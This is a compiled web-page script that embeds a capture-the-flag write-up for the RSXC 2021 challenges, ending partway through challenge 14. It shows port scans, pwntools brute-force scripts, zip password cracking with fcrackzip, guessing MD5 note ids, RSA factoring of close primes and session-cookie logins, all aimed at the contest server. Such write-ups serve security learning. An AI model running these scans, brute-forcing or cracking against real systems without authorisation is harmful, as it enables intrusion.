import{S as l4,i as i4,s as c4,C as Z3,w as r4,x as u4,y as k4,z as h4,A as kT,f as f4,t as d4,B as m4,Y as hT,l as e,r as i,a as u,m as t,n as o,u as c,h as s,c as k,p as r,G as Ze,b as l,J as n,E as b4}from"../../chunks/index-2b5eadba.js";import{L as g4}from"../../chunks/layout-4590ce8c.js";import"../../chunks/utils-e126d158.js";function v4(Je){let f,Z,J,F,d,z,$a,Qa,je,Oh,ac,Wa,La,Fh,Wp,zh,Ch,Dh,Sp,Yh,sc,Ka,Pe,Zh,nc,He,Jh,ec,as,dT=`<code class="language-shell">juki@izone:~$ nmap rsxc.no -p30000-31000 -Pn
Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-12-15 <span class="token number">23</span>:27 CET
Nmap scan report <span class="token keyword">for</span> rsxc.no <span class="token punctuation">(</span><span class="token number">134.209</span>.137.128<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.036s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">1000</span> closed ports
PORT      STATE SERVICE
<span class="token number">30780</span>/tcp <span class="token function">open</span>  unknown

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.76</span> seconds
juki@izone:~$ <span class="token function">nc</span> rsxc.no <span class="token number">30780</span>
RSXC<span class="token punctuation">&#123;</span>Congrats<span class="token operator">!</span>You_found_the_secret_port_I_was_trying_to_hide<span class="token operator">!</span><span class="token punctuation">&#125;</span></code>`,tc,ss,jh,Mp,Ph,oc,ns,Ae,Hh,pc,es,Xe,Ah,lc,Sa,Ip,Xh,qh,Op,Gh,ic,ts,qe,Bh,cc,j,$h,Fp,Qh,Lh,zp,Kh,af,rc,os,mT=`<code class="language-shell">juki@izone:~$ <span class="token function">nc</span> rsxc.no <span class="token number">20002</span>
aaaa
That is not the byte I want<span class="token operator">!</span></code>`,uc,Ge,sf,kc,ps,bT=`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#context.log_level = "debug"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"error"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rsxc.no"</span><span class="token punctuation">,</span> <span class="token number">20002</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b"RSXC&#123;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span> <span class="token comment"># flag at ascii code 212</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">break</span></code>`,hc,ls,nf,Cp,ef,fc,is,Be,tf,dc,cs,$e,of,mc,Qe,Le,pf,K,lf,bc,rs,Ke,cf,gc,us,gT=`<code class="language-undefined">// 03-challenge.txt
ZlhTWk5KQTV6d3JuVzNpQnFyeGl5cXNkSEdBelZWVkdOMVVXRkQzVG5XQjhSSlBxU3VVQjNvVGZlTjJmdll0ZnVDazRyRzk0SzRYSzUxdzlwZktTY1pqMTdBeXNKa0ZWZVpGdXV6Snh1YmF0OWRORWJBbVNGU0RBeDhvdkZGTjh5VG44WnhKUjU2THZ6NFU1dVloeTExaEVEZzRlSGlTS29EWnJvNTVWTng3NUN4RWJwRnRnOUdDZVR2dEtCVldKajVWOFRwOFIzUXI4WmhRVEhON3BGQXM4NWdoMXNzNUxXcXplUW5kTVdnenliaHgxRFU0RlczNXBTU2drdkVtYjc2dnE2TDlzeERYQXpTcXoxNzFOMkZmZ1M4aGdmZFY4VmpnQWlIc1I3ZjU2ZjdBc2h2cFZwdmZmOVd0VUZnSjJFRVBXeENCeFVHOXRQVFpjYTlFUXczaFJUd1M0RlZlTE1TUHNCdXpKWTdxU043cEs5bTlKNWs3cTRNaWI2Ym1Lem9uYXk1bUVNeXJtYVNVNFVnWm9VeG9KdkRrVkhS</code>`,vc,ks,rf,aa,uf,_c,Ma,kf,Dp,hf,ff,wc,hs,at,df,Ec,fs,st,mf,Tc,nt,et,bf,sa,gf,yc,ds,tt,vf,Vc,Ia,_f,Yp,wf,Ef,xc,ms,vT=`<code class="language-python"><span class="token comment"># Turn each char of flag into decimals for easier calculation (xoring)</span>
flag <span class="token operator">=</span> <span class="token string">"0xda0x960x0c0x960xf30x880x3b0xa60xfc0x9a0x230xba0xfd0xa90x300x8a0xfb0xa40x2d0x8a0xd00x8a0x060x8a0xe10xb60x3a0xf20xfc0x9a0x200xbd0xe90xb10x0b0xa00xfb0xa00x320xa00xe40x9a0x350xbb0xf10xa80x3b0xa70xed0xb8"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># Find key</span>
key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> key<span class="token operator">*</span><span class="token number">20</span> <span class="token comment"># Repeat the key many times</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
<span class="token comment"># XOR</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token operator">^</span>y<span class="token punctuation">)</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span>y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Rc,bs,Tf,Zp,yf,Uc,gs,ot,Vf,Nc,vs,pt,xf,Wc,lt,it,Rf,na,Uf,Sc,_s,ct,Nf,Mc,rt,Wf,Ic,ws,_T='<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span></code>',Oc,Oa,Sf,Jp,Mf,If,Fc,Es,wT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"flag"</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
<span class="token number">4</span>*<span class="token comment">#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
<span class="token number">4</span>*<span class="token comment">#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
:simen<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?</span>
jPRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
<span class="token number">4</span>*PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
<span class="token number">4</span>*PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
x<span class="token operator">&amp;</span>:chris<span class="token operator">!</span>ubuntu@172.17.0.1 PRIVMSG <span class="token comment">#channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?</span>
STOR ./flag.zip
	STOR ./flag.zip
	STOR ./flag.zip
flag.txtUT
flag.txtUT
flag.txtUT
flag.txtUT</code>`,zc,ut,Of,Cc,Ts,ET=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ binwalk -e 05-challenge.pcap

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
<span class="token number">0</span>             0x0             Libpcap capture file, little-endian, version <span class="token number">2.4</span>, Linux <span class="token string">"cooked"</span>, snaplen: <span class="token number">262144</span>
<span class="token number">44141</span>         0xAC6D          Zip archive data, encrypted at least v2.0 to extract, compressed size: <span class="token number">67</span>, uncompressed size: <span class="token number">56</span>, name: flag.txt
<span class="token number">44368</span>         0xAD50          End of Zip archive, footer length: <span class="token number">22</span>
<span class="token number">44474</span>         0xADBA          Zip archive data, encrypted at least v2.0 to extract, compressed size: <span class="token number">67</span>, uncompressed size: <span class="token number">56</span>, name: flag.txt
<span class="token number">44701</span>         0xAE9D          End of Zip archive, footer length: <span class="token number">22</span>

juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">cd</span> _05-challenge.pcap.extracted/
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">ls</span>
AC6D.zip  ADBA.zip  flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">unzip</span> -v ADBA.zip
Archive:  ADBA.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
      <span class="token number">56</span>  Defl:N       <span class="token number">55</span>   <span class="token number">2</span>% <span class="token number">2021</span>-11-10 <span class="token number">16</span>:31 79fcc455  flag.txt
--------          -------  ---                            -------
      <span class="token number">56</span>               <span class="token number">55</span>   <span class="token number">2</span>%                            <span class="token number">1</span> <span class="token function">file</span>
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ fcrackzip -u --length <span class="token number">10</span> -p <span class="token number">9954000000</span> --charset <span class="token number">1</span> ADBA.zip -v
found <span class="token function">file</span> <span class="token string">'flag.txt'</span>, <span class="token punctuation">(</span>size cp/uc     <span class="token number">67</span>/    <span class="token number">56</span>, flags <span class="token number">9</span>, chk 3be9<span class="token punctuation">)</span>


PASSWORD FOUND<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>: pw <span class="token operator">==</span> <span class="token number">9954359864</span>
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">unzip</span> ADBA.zip
Archive:  ADBA.zip
<span class="token punctuation">[</span>ADBA.zip<span class="token punctuation">]</span> flag.txt password:
replace flag.txt? <span class="token punctuation">[</span>y<span class="token punctuation">]</span>es, <span class="token punctuation">[</span>n<span class="token punctuation">]</span>o, <span class="token punctuation">[</span>A<span class="token punctuation">]</span>ll, <span class="token punctuation">[</span>N<span class="token punctuation">]</span>one, <span class="token punctuation">[</span>r<span class="token punctuation">]</span>ename: y
  inflating: flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ <span class="token function">cat</span> flag.txt
RSXC<span class="token punctuation">&#123;</span>Good_job_analyzing_the_pcap_did_you_see_the_hint?<span class="token punctuation">&#125;</span></code>`,Dc,ys,Ff,jp,zf,Yc,Vs,kt,Cf,Zc,xs,ht,Df,Jc,ft,dt,Yf,ea,Zf,jc,Rs,mt,Jf,Pc,N,jf,ta,Pf,Hf,Pp,Af,Xf,Hp,qf,Gf,bt,J3,Hc,Us,Bf,Ap,$f,Ac,Ns,gt,Qf,Xc,Ws,vt,Lf,qc,_t,wt,Kf,oa,ad,Gc,Ss,Et,sd,Bc,Tt,nd,$c,Ms,TT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ exiftool 07-challenge.jpg
ExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">11.16</span>
File Name                       <span class="token builtin class-name">:</span> 07-challenge.jpg
Directory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>
File Size                       <span class="token builtin class-name">:</span> <span class="token number">9.0</span> kB
File Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2021</span>:11:25 <span class="token number">22</span>:43:28+01:00
File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2021</span>:12:16 <span class="token number">12</span>:45:32+01:00
File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2021</span>:12:16 <span class="token number">12</span>:45:22+01:00
File Permissions                <span class="token builtin class-name">:</span> rw-r--r--
File Type                       <span class="token builtin class-name">:</span> JPEG
File Type Extension             <span class="token builtin class-name">:</span> jpg
MIME Type                       <span class="token builtin class-name">:</span> image/jpeg
JFIF Version                    <span class="token builtin class-name">:</span> <span class="token number">1.01</span>
Comment                         <span class="token builtin class-name">:</span> CREATOR: gd-jpeg v1.0 <span class="token punctuation">(</span>using IJG JPEG v80<span class="token punctuation">)</span>, quality <span class="token operator">=</span> <span class="token number">75</span>.
Exif Byte Order                 <span class="token builtin class-name">:</span> Big-endian <span class="token punctuation">(</span>Motorola, MM<span class="token punctuation">)</span>
X Resolution                    <span class="token builtin class-name">:</span> <span class="token number">96</span>
Y Resolution                    <span class="token builtin class-name">:</span> <span class="token number">96</span>
Resolution Unit                 <span class="token builtin class-name">:</span> inches
Y Cb Cr Positioning             <span class="token builtin class-name">:</span> Centered
Thumbnail Offset                <span class="token builtin class-name">:</span> <span class="token number">199</span>
Thumbnail Length                <span class="token builtin class-name">:</span> <span class="token number">2265</span>
Image Width                     <span class="token builtin class-name">:</span> <span class="token number">798</span>
Image Height                    <span class="token builtin class-name">:</span> <span class="token number">69</span>
Encoding Process                <span class="token builtin class-name">:</span> Baseline DCT, Huffman coding
Bits Per Sample                 <span class="token builtin class-name">:</span> <span class="token number">8</span>
Color Components                <span class="token builtin class-name">:</span> <span class="token number">1</span>
Image Size                      <span class="token builtin class-name">:</span> 798x69
Megapixels                      <span class="token builtin class-name">:</span> <span class="token number">0.055</span>
Thumbnail Image                 <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>Binary data <span class="token number">2265</span> bytes, use -b option to extract<span class="token punctuation">)</span></code>`,Qc,pa,ed,la,td,od,yt,j3,Lc,Is,pd,Xp,ld,Kc,Os,Vt,id,ar,Fs,xt,cd,sr,Rt,Ut,rd,ia,ud,nr,zs,Nt,kd,er,V,hd,qp,fd,dd,Gp,md,bd,Bp,gd,vd,$p,_d,wd,tr,Cs,Ed,Qp,Td,or,Ds,Wt,yd,pr,Ys,St,Vd,lr,Mt,It,xd,ca,Rd,ir,Zs,Ot,Ud,cr,C,Nd,Lp,Wd,Sd,Kp,Md,Id,Ft,P3,rr,zt,Od,ur,Js,yT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> -n note0 <span class="token operator">|</span> md5sum
65b29a77142a5c237d7b21c005b72157  -</code>`,kr,P,Fd,ra,zd,Cd,al,Dd,Yd,hr,js,VT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> -n flag <span class="token operator">|</span> md5sum
327a6c4304ad5938eaf0efb6cc3e53dc  -
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20009/notes.php?id<span class="token operator">=</span>327a6c4304ad5938eaf0efb6cc3e53dc <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span>
RSXC<span class="token punctuation">&#123;</span>MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext<span class="token punctuation">&#125;</span></code>`,fr,Ps,Zd,sl,Jd,dr,Hs,Ct,jd,mr,As,Dt,Pd,br,Yt,Zt,Hd,ua,Ad,gr,Xs,Jt,Xd,vr,H,qd,nl,Gd,Bd,el,$d,Qd,_r,qs,xT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -I rsxc.no:20010/
HTTP/1.1 <span class="token number">200</span> OK
Date: Thu, <span class="token number">16</span> Dec <span class="token number">2021</span> <span class="token number">16</span>:20:12 GMT
Server: Apache/2.4.51 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
X-Powered-By: PHP/7.4.26
Flag: RSXC<span class="token punctuation">&#123;</span>Sometimes_headers_can_tell_you_something_useful<span class="token punctuation">&#125;</span>
Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8</code>`,wr,Gs,Ld,tl,Kd,Er,Bs,jt,am,Tr,$s,Pt,sm,yr,Ht,At,nm,ka,em,Vr,Qs,Xt,tm,xr,Fa,om,ol,pm,lm,Rr,A,im,pl,cm,rm,ll,um,km,Ur,Ls,RT=`<code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA <span class="token comment">#pycryptodome</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> randprime<span class="token punctuation">,</span> nextprime<span class="token punctuation">,</span> invert
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> mpz

<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rsa.out"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        n<span class="token punctuation">,</span>_<span class="token punctuation">,</span>ct <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    ct <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ct<span class="token punctuation">)</span>
    n <span class="token operator">=</span> mpz<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> <span class="token number">65537</span>
    estimate <span class="token operator">=</span> mpz<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    prime <span class="token operator">=</span> estimate
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"r: "</span><span class="token punctuation">,</span>estimate<span class="token punctuation">)</span>
    p <span class="token operator">=</span> mpz<span class="token punctuation">(</span>prime<span class="token punctuation">)</span>
    q <span class="token operator">=</span> mpz<span class="token punctuation">(</span>n <span class="token operator">//</span> p<span class="token punctuation">)</span>
    <span class="token keyword">assert</span><span class="token punctuation">(</span>p<span class="token operator">*</span>q <span class="token operator">==</span> n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p: "</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q: "</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    rsa <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">)</span>
decode<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Nr,Ks,hm,il,fm,Wr,an,qt,dm,Sr,sn,Gt,mm,Mr,Bt,cl,bm,Ir,nn,$t,gm,Or,Qt,vm,Fr,en,UT=`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode

sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rsxc.no"</span><span class="token punctuation">,</span> <span class="token number">20012</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>
    q<span class="token punctuation">,</span>a <span class="token operator">=</span> q<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> q<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> <span class="token string">"reverse"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">elif</span> <span class="token string">"hex"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"lower"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"base64"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,zr,tn,_m,rl,wm,Cr,on,Lt,Em,Dr,pn,Kt,Tm,Yr,ao,so,ym,ha,Vm,Zr,ln,no,xm,Jr,za,Rm,ul,Um,Nm,jr,cn,NT=`<code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Todos</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> b64 <span class="token operator">=</span> <span class="token string">'UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0='</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Hide this somewhere, and not just rely on base64: </span><span class="token punctuation">&#123;</span>b64<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>`,Pr,eo,Wm,Hr,rn,WT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0</span><span class="token operator">=</span> <span class="token operator">|</span> base64 -d
RSXC<span class="token punctuation">&#123;</span>it_might_be_there_even_if_you_don't_include_it<span class="token operator">!</span><span class="token punctuation">&#125;</span></code>`,Ar,un,Sm,kl,Mm,Xr,kn,to,Im,qr,hn,oo,Om,Gr,po,lo,Fm,fa,zm,Br,fn,io,Cm,$r,da,Dm,ma,Ym,Zm,co,H3,Qr,ro,Jm,Lr,dn,ST=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token assign-left variable">TEMP14</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20014/'</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"PHPSESSID=.*?;"</span><span class="token variable">)</span></span> <span class="token comment"># Get PHPSESSIONID</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> <span class="token string">'http://rsxc.no:20014/'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP14<span class="token variable">)</span></span>"</span> --data-raw <span class="token string">'username=test&amp;password=test'</span> <span class="token comment"># LOGIN</span>
